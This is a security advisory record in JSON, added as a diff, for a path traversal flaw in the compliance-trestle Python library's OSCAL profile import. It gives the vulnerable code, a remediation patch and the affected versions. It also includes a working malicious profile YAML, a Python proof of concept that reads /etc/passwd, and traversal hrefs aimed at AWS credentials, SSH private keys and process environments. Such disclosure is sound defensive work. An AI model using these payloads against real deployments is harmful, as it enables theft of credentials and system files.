@@ -1,0 +1,181 @@
+{
+  "id": "GHSA-mj4x-vf5c-5xg8",
+  "modified": "2026-05-28T17:45:08.636409678Z",
+  "published": "2026-05-28T17:37:08Z",
+  "aliases": [
+    "CVE-2026-45774"
+  ],
+  "summary": "compliance-trestle Profile Import has an Arbitrary File Read via trestle:// URI and Relative Path Traversal",
+  "details": "## Summary\n\nThe compliance-trestle library's profile import mechanism resolves `trestle://` URIs and relative file paths by joining them with `trestle_root` and calling `.resolve()`, but performs **no boundary check** to ensure the resolved path stays within the trestle workspace. An attacker can craft a malicious OSCAL profile YAML with `imports[].href` containing path traversal sequences to read arbitrary files from the server filesystem.\n\nThree attack vectors confirmed:\n1. **PT-001:** `trestle://../../etc/passwd` — via trestle:// URI scheme\n2. **PT-002:** `../../etc/passwd` — via relative path in href\n3. **PT-003:** back_matter rlinks with traversal paths\n\n**Preconditions:** Victim must import/resolve an attacker-controlled OSCAL profile YAML.\n\n\n## Affected Component\n\n**Repository:** https://github.com/IBM/compliance-trestle\n**File:** `trestle/core/remote/cache.py` (lines 175-179)\n**File:** `trestle/core/resolver/_import.py` (line 104)\n**Version:** v4.0.2 (latest as of 2026-04-30)\n\n## Vulnerable Code\n\n### cache.py:175-179 — LocalFetcher (trestle:// URI handling)\n\n```python\nclass LocalFetcher(FetcherBase):\n    def __init__(self, trestle_root: pathlib.Path, uri: str) -\u003e None:\n        super().__init__(trestle_root, uri)\n        # ...\n        elif uri.startswith(const.TRESTLE_HREF_HEADING):\n            uri = str(trestle_root / uri[len(const.TRESTLE_HREF_HEADING) :])\n            self._abs_path = pathlib.Path(uri).resolve()\n            # ❌ NO boundary check — .resolve() follows ../\n            # ❌ NO is_relative_to() validation\n            # ❌ Result can be /etc/passwd\n            self._cached_object_path = self._abs_path\n            return\n```\n\n### cache.py:194 — LocalFetcher (relative path handling)\n\n```python\n        # For relative paths (no trestle:// or file:// prefix):\n        try:\n            self._abs_path = pathlib.Path(uri).resolve()\n            # ❌ Same issue — resolves relative to CWD with no boundary check\n        except Exception:\n            raise TrestleError(...)\n```\n\n### _import.py:73-104 — Profile import href resolution\n\n```python\nclass Import(Pipeline.Filter):\n    def __init__(self, ...):\n        # Line 73-83: back_matter rlinks used directly\n        if self._import.href[0] == '#':\n            resource = [r for r in self._resources if r.uuid == self._import.href[1:]][0]\n            self._import.href = [\n                rlink.href  # ❌ rlink.href from OSCAL data — user-controlled\n                for rlink in resource.rlinks\n                if rlink.href.endswith('.json') or rlink.href.endswith('.yaml')\n            ][0]\n\n        # Line 104: href passed directly to FetcherFactory\n        fetcher = cache.FetcherFactory.get_fetcher(self._trestle_root, self._import.href)\n```\n\n**Root Cause:**\n1. `Path(trestle_root / \"../../etc/passwd\").resolve()` = `/etc/passwd`\n2. No `is_relative_to(trestle_root)` check after resolve\n3. `TRESTLE_HREF_REGEX` defined at `const.py:253` but **NEVER enforced** (dead code)\n4. Even if enforced, the regex `'^trestle://[^/]'` would PASS traversal payloads (`.` is `[^/]`)\n\n\n## Steps to Reproduce\n\n### Prerequisites\n\n```bash\npip install compliance-trestle==4.0.2\n```\n\n### PoC: Malicious OSCAL Profile\n\n```yaml\n# malicious_profile.yaml\nprofile:\n  uuid: \"550e8400-e29b-41d4-a716-446655440000\"\n  metadata:\n    title: \"Malicious Profile\"\n    version: \"1.0\"\n    last-modified: \"2024-01-01T00:00:00+00:00\"\n    oscal-version: \"1.0.4\"\n  imports:\n    - href: \"trestle://../../../../../../etc/passwd\"\n```\n\n### PoC: Direct LocalFetcher Exploit\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC: trestle:// path traversal via real LocalFetcher\"\"\"\nfrom pathlib import Path\nfrom trestle.core.remote.cache import LocalFetcher\nimport tempfile\n\ntrestle_root = Path(tempfile.mkdtemp())\n\n# Normal usage — stays within workspace\nnormal = LocalFetcher(trestle_root, \"trestle://catalogs/test/catalog.json\")\nprint(f\"Normal: {normal._abs_path}\")  # /tmp/xxx/catalogs/test/catalog.json\n\n# Exploit — escapes workspace\nevil = LocalFetcher(trestle_root, \"trestle://../../../../../../etc/passwd\")\nprint(f\"Evil:   {evil._abs_path}\")    # /etc/passwd\nprint(f\"Content: {evil._abs_path.read_text().split(chr(10))[0]}\")\n# Output: root:x:0:0:root:/root:/bin/bash\n```\n\n**Expected:** Path traversal blocked with error\n**Actual:** `/etc/passwd`, `/etc/shadow`, `/proc/self/environ` read successfully\n\n\n## Remediation\n\n```python\nclass LocalFetcher(FetcherBase):\n    def __init__(self, trestle_root: pathlib.Path, uri: str) -\u003e None:\n        super().__init__(trestle_root, uri)\n        # ...\n        elif uri.startswith(const.TRESTLE_HREF_HEADING):\n            uri = str(trestle_root / uri[len(const.TRESTLE_HREF_HEADING) :])\n            self._abs_path = pathlib.Path(uri).resolve()\n\n            # ✅ ADD: Boundary check\n            if not self._abs_path.is_relative_to(self._trestle_root):\n                raise TrestleError(\n                    f\"Path traversal blocked: resolved path '{self._abs_path}' \"\n                    f\"is outside trestle root '{self._trestle_root}'\"\n                )\n\n            self._cached_object_path = self._abs_path\n            return\n```\n\nSame fix needed for relative path handling at line 194.\n\nAdditionally, enforce `TRESTLE_HREF_REGEX` (already defined at `const.py:253` but never used).\n\n\n## Resources\n\n- **CWE-22:** https://cwe.mitre.org/data/definitions/22.html\n- **OSCAL Profile Resolution:** https://pages.nist.gov/OSCAL/concepts/processing/profile-resolution/\n- **compliance-trestle:** https://github.com/IBM/compliance-trestle\n\n## Impact\n\n1. **Credential Theft via OSCAL Import:**\n   ```yaml\n   imports:\n     - href: \"trestle://../../root/.aws/credentials\"\n     - href: \"trestle://../../root/.ssh/id_rsa\"\n   ```\n\n2. **System Reconnaissance:**\n   ```yaml\n   imports:\n     - href: \"trestle://../../etc/passwd\"\n     - href: \"trestle://../../proc/self/environ\"\n   ```\n\n3. **Supply Chain Attack:**\n   Attacker publishes malicious OSCAL profile to public compliance catalog. Organizations importing it leak server files during profile resolution.\n\n4. **Dead Code Evidence:**\n   `TRESTLE_HREF_REGEX` defined at `const.py:253` but never enforced anywhere — proves path validation was INTENDED but never implemented.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.0.0"
+            },
+            {
+              "fixed": "4.0.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.0.0",
+        "4.0.1",
+        "4.0.2"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 4.0.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-mj4x-vf5c-5xg8/GHSA-mj4x-vf5c-5xg8.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.12.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.1.0",
+        "0.1.1",
+        "0.10.0",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.14.4",
+        "0.15.0",
+        "0.15.1",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.25.1",
+        "0.26.0",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.28.0",
+        "0.28.1",
+        "0.29.0",
+        "0.3.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.32.1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0rc0",
+        "1.0.1",
+        "1.0.2",
+        "1.1.0",
+        "1.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.6.0",
+        "2.6.1",
+        "3.0.1",
+        "3.1.0",
+        "3.10.2",
+        "3.10.3",
+        "3.10.4",
+        "3.11.0",
+        "3.12.0",
+        "3.12.1",
+        "3.2.0",
+        "3.3.0",
+        "3.4.0",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.8.0",
+        "3.8.1",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-mj4x-vf5c-5xg8/GHSA-mj4x-vf5c-5xg8.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-mj4x-vf5c-5xg8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/5c65c5926fe7ca908b9c1d281f904e7d97ba8310"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/d00a0c2f702c24f7016009fbd626036f5c46f47b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/oscal-compass/compliance-trestle"
+    }
+  ]
+}
